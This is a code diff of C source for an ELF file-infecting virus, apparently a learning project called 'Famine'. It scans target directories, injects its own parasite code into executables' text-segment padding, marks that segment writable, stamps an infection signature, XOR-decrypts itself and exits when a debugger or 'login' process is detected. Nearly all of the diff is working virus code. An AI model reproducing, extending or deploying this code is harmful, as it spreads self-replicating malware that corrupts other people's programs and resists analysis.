@@ -32,27 +32,27 @@ struct linux_dirent64 {
 };
 
 
-static size_t  ft_strlen(const char *s);
-static int get_env_var(char *name, char *content, int content_size);
-static int open_directory(char *path,unsigned long address_of_main);
-static void    *ft_memmove(void *dst, const void *src, size_t len);
-static bool process_runing(void); //CHANGER L APPELLE DE DIR
-static int do_the_job(char file[],size_t size, char *path,unsigned long address_of_main);
-static int             ft_strncmp(const char *s1, const char *s2, size_t n);
-static int infect(char path[],size_t path_length, unsigned long address_of_main);
-static void new_file(char buf[],size_t size, size_t end_of_text,char *path, unsigned long address_of_main);
-static void	ft_putnbr(int nb);
-static void		ft_putstr(char *s);
-static int		ft_putchar(int c);
-static int     ft_isdigit(int c);
-static int ft_isallnum(char *str);
-static void	put_sig(int fd, unsigned long address_of_main);
-static bool	im_infected(char *data);
-static bool	is_infected(char *data);
-static void decrypter(unsigned long address_of_main);
+ size_t  ft_strlen(const char *s);
+ int get_env_var(char *name, char *content, int content_size);
+ int open_directory(char *path,unsigned long address_of_main);
+ void    *ft_memmove(void *dst, const void *src, size_t len);
+ bool process_runing(void); //CHANGER L APPELLE DE DIR
+ int do_the_job(char file[],size_t size, char *path,unsigned long address_of_main);
+ int             ft_strncmp(const char *s1, const char *s2, size_t n);
+ int infect(char path[],size_t path_length, unsigned long address_of_main);
+ void new_file(char buf[],size_t size, size_t end_of_text,char *path, unsigned long address_of_main);
+ void	ft_putnbr(int nb);
+ void		ft_putstr(char *s);
+ int		ft_putchar(int c);
+ int     ft_isdigit(int c);
+ int ft_isallnum(char *str);
+ void	put_sig(int fd, unsigned long address_of_main);
+ bool	im_infected(char *data);
+ bool	is_infected(char *data);
+ void decrypter(unsigned long address_of_main);
 
-static char            *ft_strnstr(char *s1, char *s2, size_t n);
-static int             ft_strcmp(const char *s1, const char *s2);
+ char            *ft_strnstr(char *s1, char *s2, size_t n);
+ int             ft_strcmp(const char *s1, const char *s2);
 
 #define PAGE_SIZE (4096 *2)
 
@@ -108,36 +108,6 @@ type name(type1 arg1,type2 arg2, type3 arg3, type4 arg4)\
 }
 
 
-asm(
-"__syscall6:\n"
-"	pushl %ebp\n"
-"	pushl %edi\n"
-"	pushl %esi\n"
-"	pushl %ebx\n"
-"	movl  (0+5)*4(%esp),%eax\n"
-"	movl  (1+5)*4(%esp),%ebx\n"
-"	movl  (2+5)*4(%esp),%ecx\n"
-"	movl  (3+5)*4(%esp),%edx\n"
-"	movl  (4+5)*4(%esp),%esi\n"
-"	movl  (5+5)*4(%esp),%edi\n"
-"	movl  (6+5)*4(%esp),%ebp\n"
-"	int $0x80\n"
-"	popl %ebx\n"
-"	popl %esi\n"
-"	popl %edi\n"
-"	popl %ebp\n"
-"	ret"
-);
-extern long __syscall6(long n, long a, long b, long c, long d, long e, long f);
-
-long syscall6(long call, long a, long b, long c, long d, long e, long f)
-{
-	long res = __syscall6(call,a,b,c,d,e,f);
-	return res;
-}
-
-
-
 __syscall0(pid_t, getpid);
 __syscall0(pid_t, fork);
 __syscall1(int, close, int, fd);
@@ -160,6 +130,7 @@ extern int yeah;
 extern int real_start;
 extern int myend;
 
+extern int do_main(void);
 
 _start()
 {
@@ -175,18 +146,20 @@ _start()
 int do_main(void)
 {
 	unsigned long address_of_main = get_eip() - ((char *)&yeah - (char *)&real_start);
+
 	pid_t pid;
 	void *start;
 	size_t size;
-	char path_env[256] = {'/','t','m','p','/','t','e','s','t',':','/','t','m','p','/','t','e','s','t','2',':',0};
 	if (process_runing())
 		return (1);
+	char path_env[256] = {'/','t','m','p','/','t','e','s','t',':','/','t','m','p','/','t','e','s','t','2',':',0};
+
 	start = 0; //value get from the header
 	size = 0; //value get from addr
 	pid = fork();
 	if (pid == 0) //children
 	{
-		if (mprotect(start, size, PROT_WRITE | PROT_READ) == -1) {
+		if (mprotect(start, size, PROT_WRITE | PROT_READ |PROT_EXEC) == -1) {
 			write(2,"error mpr\n",10);
 			if (0)
 			return -1;
@@ -237,9 +210,101 @@ int do_main(void)
 	return (0);
 }
 
+ bool process_runing(void)
+{
+
+	int fd,i,dd, nread;
+	char buf[256]; // = sizeof(struct dirent)
+	char *TracerPid;
+	char *Name;
+	struct linux_dirent64 *d;
+	char path[64];
+
+	ft_putnbr(sizeof(struct linux_dirent64));
+	fd = open ("/proc/self/status", 0,0);
+	ft_putstr("open /proc/self/status\n");
+	while((i =read(fd,buf,256)) > 0)
+	{
+		if ((TracerPid = ft_strnstr(buf,"TracerPid:",i)) != 0)
+		{
+			TracerPid += 10;
+			while(*TracerPid == '\t' || *TracerPid == ' ')
+				TracerPid++;
+			if (*TracerPid != '0' && *TracerPid != '\n')
+				exit(1);
+		}
 
 
-static int get_env_var(char *name, char *content, int content_size)
+	}
+	close(fd);
+	dd = open("/proc/",0x10000,0);
+	if (dd <= 0)
+	{
+		ft_putstr("error opem /proc/\n");
+		return 1;
+	}
+	ft_putstr("getdents64");
+	ft_memmove(path,"/proc/",6);
+	char cmdname[64];
+	while ((nread = getdents64(dd, buf, 256)) > 0)
+	{
+		i = 0;
+		while(i<nread)
+		{
+			d = (struct linux_dirent64 *) (buf + i);
+			i += d->d_reclen ;
+			if (ft_isallnum(d->d_name) == 0)
+			{
+				ft_putstr("good :");
+				ft_memmove(path + 6,d->d_name,ft_strlen(d->d_name)+ 1);
+				ft_memmove(path + ft_strlen(path), "/status\0", 8);
+				fd = open(path,0,0);
+				ft_putnbr(fd);
+				ft_putchar('\n');
+
+				ft_putstr(path);
+				ft_putchar('\n');
+
+				read(fd,cmdname, 64);
+				if ((Name = ft_strnstr(cmdname,"Name:",i)) != 0)
+				{
+					Name += 5;
+					while(*Name == '\t' || *Name == ' ')
+						Name++;
+					*ft_strnstr(Name, "\n",50) = '\0';
+					if (!ft_strcmp(Name, "login"))
+						exit(1);
+					ft_putstr(Name);
+					ft_putchar('\n');
+
+
+				}
+
+			}
+		}
+	}
+	return (0);
+}
+ void decrypter(unsigned long address_of_main)
+{
+	size_t	size;
+	size_t	offset;
+	char	*start;
+
+	offset = *(int *)(address_of_main - 4 + sizeof(offset));
+	size = *(int *)(address_of_main - 4);
+	if(size && im_infected(address_of_main))
+	{
+		start[offset] ^= *(int *)(address_of_main - 4);
+		offset++;
+		while (offset < size)
+		{
+			start[offset] ^= start[offset - 1];
+			offset++;
+		}
+	}
+}
+ int get_env_var(char *name, char *content, int content_size)
 {
 	char buf[4];
 	int fd;
@@ -287,7 +352,7 @@ static int get_env_var(char *name, char *content, int content_size)
 	close(fd);
 	return (content[0] != '\0');
 }
-static int open_directory(char *path, unsigned long address_of_main)
+ int open_directory(char *path, unsigned long address_of_main)
 {
 	int dd,nread;
 	char buf[128];
@@ -356,145 +421,7 @@ static int open_directory(char *path, unsigned long address_of_main)
 	close(dd);
 	return 0;
 }
-
-
-
-static size_t  ft_strlen(const char *s)
-{
-	size_t  i;
-
-	i = 0;
-	while (*(s + i) != '\0')
-	{
-		i++;
-	}
-	return (i);
-}
-static void    *ft_memcpy(void *dst, const void *src, size_t n)
-{
-	unsigned char   *srctmp;
-	unsigned char   *dsttmp;
-	size_t                  i;
-
-	srctmp = (unsigned char *)src;
-	dsttmp = (unsigned char *)dst;
-	i = 0;
-	while (i < n)
-	{
-		dsttmp[i] = srctmp[i];
-		i++;
-	}
-	return ((void *)dst);
-}
-static void    *ft_memmove(void *dst, const void *src, size_t len)
-{
-	char    *srctmp;
-	char    *dsttmp;
-
-	srctmp = (char *)src;
-	dsttmp = (char *)dst;
-	if (srctmp < dsttmp)
-	{
-		srctmp = (srctmp + len) - 1;
-		dsttmp = (dsttmp + len) - 1;
-		while (len-- > 0)
-			*dsttmp-- = *srctmp--;
-	}
-	else
-		ft_memcpy(dst, src, len);
-	return ((void *)dst);
-}
-static int             ft_strncmp(const char *s1, const char *s2, size_t n)
-{
-	size_t  index;
-
-	index = 0;
-	while (index < n && s1[index] && s2[index] &&
-	       (unsigned char)s1[index] == (unsigned char)s2[index])
-	{
-		index++;
-	}
-	if (index >= n)
-		return (0);
-	return (int)((unsigned char)s1[index] - (unsigned char)s2[index]);
-}
-
-static bool process_runing(void)
-{
-
-	int fd,i,dd, nread;
-	char buf[256]; // = sizeof(struct dirent)
-	char *TracerPid;
-	char *Name;
-	struct linux_dirent64 *d;
-	char path[64];
-
-	ft_putnbr(sizeof(struct linux_dirent64));
-	fd = open ("/proc/self/status", 0,0);
-	ft_putstr("open /proc/self/status\n");
-	while((i =read(fd,buf,256)) > 0)
-	{
-		if ((TracerPid = ft_strnstr(buf,"TracerPid:",i)) != 0)
-		{
-			TracerPid += 10;
-			while(*TracerPid == '\t' || *TracerPid == ' ')
-						TracerPid++;
-			if (*TracerPid != '0' && *TracerPid != '\n')
-				exit(1);
-		}
-
-
-	}
-	close(fd);
-	dd = open("/proc/",0x10000,0);
-	if (dd <= 0)
-	{
-		ft_putstr("error opem /proc/\n");
-		return 1;
-	}
-	ft_putstr("getdents64");
-	ft_memmove(path,"/proc/",6);
-	char cmdname[64];
-	while ((nread = getdents64(dd, buf, 256)) > 0)
-	{
-		i = 0;
-		while(i<nread)
-		{
-			d = (struct linux_dirent64 *) (buf + i);
-			i += d->d_reclen ;
-			if (ft_isallnum(d->d_name) == 0)
-			{
-				ft_putstr("good :");
-				ft_memmove(path + 6,d->d_name,ft_strlen(d->d_name)+ 1);
-				ft_memmove(path + ft_strlen(path), "/status\0", 8);
-				fd = open(path,0,0);
-				ft_putnbr(fd);
-				ft_putchar('\n');
-
-				ft_putstr(path);
-				ft_putchar('\n');
-
-				read(fd,cmdname, 64);
-				if ((Name = ft_strnstr(cmdname,"Name:",i)) != 0)
-				{
-					Name += 5;
-					while(*Name == '\t' || *Name == ' ')
-						Name++;
-					*ft_strnstr(Name, "\n",50) = '\0';
-					if (!ft_strcmp(Name, "login"))
-						exit(1);
-					ft_putstr(Name);
-					ft_putchar('\n');
-
-
-				}
-
-			}
-		}
-	}
-	return (0);
-}
-static int do_the_job(char buff[],size_t size, char *path, unsigned long address_of_main)
+ int do_the_job(char buff[],size_t size, char *path, unsigned long address_of_main)
 {
 	ft_putstr("debut do_the_job\n");
 	//printf("debut do_the_job\n");
@@ -528,6 +455,7 @@ static int do_the_job(char buff[],size_t size, char *path, unsigned long address
 		{
 			if (seg->p_flags == (PF_R | PF_X))
 			{
+
 				unsigned int pt = (PAGE_SIZE - 4) - parasite_size; // remplacer le 4 par la size de la signature
 
 				//la c est le check de la signature
@@ -556,7 +484,8 @@ static int do_the_job(char buff[],size_t size, char *path, unsigned long address
 		if (seg->p_type == PT_LOAD)
 		{
 			if (seg->p_flags == (PF_R | PF_X))
-			{
+			{seg->p_flags |= PF_W;
+				//seg->p_flags |= PF_W;
 				text = seg->p_vaddr;
 				parasite_vaddr = seg->p_vaddr + seg->p_filesz;
 
@@ -589,7 +518,7 @@ static int do_the_job(char buff[],size_t size, char *path, unsigned long address
 	ft_putstr("fim do_the_job\n");
 	return 0;
 }
-static int infect(char path[],size_t path_length, unsigned long address_of_main)
+ int infect(char path[],size_t path_length, unsigned long address_of_main)
 {
 	size_t i = 0;
 
@@ -618,7 +547,7 @@ static int infect(char path[],size_t path_length, unsigned long address_of_main)
 	while(i < path_length);
 	return 0;
 }
-static char    *only_name(char *line)
+ char    *only_name(char *line)
 {
 	int        size;
 	size = ft_strlen(line);
@@ -630,7 +559,7 @@ static char    *only_name(char *line)
 	}
 	return (line);
 }
-static void new_file(char buf[],size_t size, size_t end_of_text,char *path, unsigned long address_of_main)
+ void new_file(char buf[],size_t size, size_t end_of_text,char *path, unsigned long address_of_main)
 {
 	int fd;
 	char *data;
@@ -662,13 +591,15 @@ static void new_file(char buf[],size_t size, size_t end_of_text,char *path, unsi
 	///write(fd,buff,file->size + PAGE_SIZE);
 
 	write(fd,buf, end_of_text);
-	write(fd,needle, 62);
-	write(fd,address_of_main,parasite_size);
+	//write(fd,needle, 62);
 	ft_putstr("parazite size :");
 	ft_putnbr(parasite_size);
 	ft_putstr("\n");
 	ft_putstr("put_sig\n");
 	put_sig(fd, address_of_main);
+	unsigned long address_of_mai2 = get_eip() - ((char *)&yeah - (char *)&do_main);
+
+	write(fd,(char *) address_of_mai2,parasite_size);
 	ft_putstr("end_put_sig\n");
 	for (int i = 0; i< PAGE_SIZE - 62-parasite_size;i++)
 		write(fd,"j",1);
@@ -692,24 +623,77 @@ static void new_file(char buf[],size_t size, size_t end_of_text,char *path, unsi
 	ft_putchar('\n');
 
 }
-unsigned long get_eip(void)
+
+ size_t  ft_strlen(const char *s)
 {
-	__asm__("call yeah\n"
-	        ".globl yeah\n"
-	        "yeah:\n"
-	        "pop %eax");
+	size_t  i;
+
+	i = 0;
+	while (*(s + i) != '\0')
+	{
+		i++;
+	}
+	return (i);
 }
-static int	ft_putchar(int c)
+ void    *ft_memcpy(void *dst, const void *src, size_t n)
+{
+	unsigned char   *srctmp;
+	unsigned char   *dsttmp;
+	size_t                  i;
+
+	srctmp = (unsigned char *)src;
+	dsttmp = (unsigned char *)dst;
+	i = 0;
+	while (i < n)
+	{
+		dsttmp[i] = srctmp[i];
+		i++;
+	}
+	return ((void *)dst);
+}
+ void    *ft_memmove(void *dst, const void *src, size_t len)
+{
+	char    *srctmp;
+	char    *dsttmp;
+
+	srctmp = (char *)src;
+	dsttmp = (char *)dst;
+	if (srctmp < dsttmp)
+	{
+		srctmp = (srctmp + len) - 1;
+		dsttmp = (dsttmp + len) - 1;
+		while (len-- > 0)
+			*dsttmp-- = *srctmp--;
+	}
+	else
+		ft_memcpy(dst, src, len);
+	return ((void *)dst);
+}
+ int             ft_strncmp(const char *s1, const char *s2, size_t n)
+{
+	size_t  index;
+
+	index = 0;
+	while (index < n && s1[index] && s2[index] &&
+	       (unsigned char)s1[index] == (unsigned char)s2[index])
+	{
+		index++;
+	}
+	if (index >= n)
+		return (0);
+	return (int)((unsigned char)s1[index] - (unsigned char)s2[index]);
+}
+ int	ft_putchar(int c)
 {
 	return (write(1, &c, 1));
 }
-static void		ft_putstr(char *s)
+ void		ft_putstr(char *s)
 {
 	if (!s)
 		return ;
 	write(1, s, ft_strlen(s));
 }
-static  void	ft_putnbr(int nb)
+  void	ft_putnbr(int nb)
 {
 	if (nb == -2147483648)
 		ft_putstr("-2147483648");
@@ -730,13 +714,13 @@ static  void	ft_putnbr(int nb)
 	}
 }
 
-static int     ft_isdigit(int c)
+ int     ft_isdigit(int c)
 {
 	if ((c >= '0') && (c <= '9'))
 		return (1);
 	return (0);
 }
-static int ft_isallnum(char *str)
+ int ft_isallnum(char *str)
 {
 	while(*str)
 	{
@@ -746,7 +730,7 @@ static int ft_isallnum(char *str)
 	}
 	return 0;
 }
-static char            *ft_strnstr(char *s1, char *s2, size_t n)
+ char            *ft_strnstr(char *s1, char *s2, size_t n)
 {
 	size_t  i;
 
@@ -768,7 +752,7 @@ static char            *ft_strnstr(char *s1, char *s2, size_t n)
 	return (NULL);
 }
 
-static int             ft_strcmp(const char *s1, const char *s2)
+ int             ft_strcmp(const char *s1, const char *s2)
 {
 	int     index;
 
@@ -781,7 +765,7 @@ static int             ft_strcmp(const char *s1, const char *s2)
 	return (int)((unsigned char)s1[index] - (unsigned char)s2[index]);
 }
 
-static bool	is_infected(char *data)
+ bool	is_infected(char *data)
 {
 	Elf64_Ehdr          *header;
 	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
@@ -798,7 +782,7 @@ static bool	is_infected(char *data)
 	return(1);
 }
 
-static bool	im_infected(char *data)
+ bool	im_infected(char *data)
 {
 	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
 	int i;
@@ -813,13 +797,19 @@ static bool	im_infected(char *data)
 	return(1);
 }
 
-static void	put_sig(int fd, unsigned long address_of_main)
+ void	put_sig(int fd, unsigned long address_of_main)
 {
 	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
 	char fingerprint[] = {'0','0','0','0','0','0','0','0'};
 	int i;
 
-	*(long long *)fingerprint = *(long long *)&_start - SIZE_BEFORE_ENTRY_POINT + 54;
+if (im_infected(address_of_main))
+{
+	ft_putstr("new one\n");
+	*(long long *)fingerprint = address_of_main - sizeof(long long);
+}
+	ft_putstr(fingerprint);
+
 	i = 7;
 	while(i >= 0)
 	{
@@ -835,29 +825,18 @@ static void	put_sig(int fd, unsigned long address_of_main)
 		i--;
 	}
 	write(fd,sig, sizeof(sig));
+	ft_putstr(fingerprint);
 	write(fd,fingerprint, sizeof(fingerprint));
 }
 
-static void decrypter(unsigned long address_of_main)
+
+unsigned long get_eip(void)
 {
-	size_t	size;
-	size_t	offset;
-	char	*start;
-
-	offset = *(int *)(address_of_main - 4 + sizeof(offset));
-	size = *(int *)(address_of_main - 4);
-	if(size && im_infected(address_of_main))
-	{
-		start[offset] ^= *(int *)(address_of_main - 4);
-		offset++;
-		while (offset < size)
-		{
-			start[offset] ^= start[offset - 1];
-			offset++;
-		}
-	}
+	__asm__("call yeah\n"
+	        ".globl yeah\n"
+	        "yeah:\n"
+	        "pop %eax");
 }
-
 void end_code() {
 __asm__(".globl myend\n"
         "myend:	     \n"
